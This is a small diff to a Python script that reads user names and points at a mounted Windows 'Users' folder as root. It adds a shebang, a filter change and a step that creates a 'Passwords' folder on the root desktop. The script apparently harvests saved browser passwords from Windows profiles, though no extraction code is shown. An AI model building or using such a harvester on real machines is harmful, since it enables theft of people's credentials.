@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 WindowsUserDirectory="/media/root/OS/Users"
 prefix=""
 googleDirectory="" #default
@@ -9,10 +10,13 @@ fin=open('users')
 data=fin.readlines()
 usernames=[]
 for i in data:
-    if str(i)[:2]==prefix and prefixFlag:
+    if str(i)[:2]==prefix or not prefixFlag:
         usernames.append(i.strip())
 fin.close()
-
+try:
+	os.system('mkdir /root/Desktop/Passwords')
+except:
+	pass
 #print(usernames)
 for i in usernames:
     try:
